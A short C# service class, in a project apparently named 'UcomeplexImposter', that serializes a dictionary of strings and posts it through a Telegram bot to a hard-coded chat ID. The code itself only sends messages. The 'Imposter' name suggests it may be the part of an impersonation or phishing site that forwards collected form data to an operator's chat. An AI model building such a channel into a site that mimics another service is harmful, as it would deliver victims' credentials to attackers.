using System.Text.Json;
using Telegram.Bot;

namespace UcomeplexImposter.Service
{
    public class TelegramBotService
    {
        public const long ChatId = -4040275588;

        private readonly TelegramBotClient _botClient;

        public TelegramBotService(string botToken)
        {
            _botClient = new TelegramBotClient(botToken);
        }

        public async Task SendMessage(Dictionary<string, string> data)
        {
            await _botClient.SendTextMessageAsync(chatId: ChatId, JsonSerializer.Serialize(data));
        }
    }


}
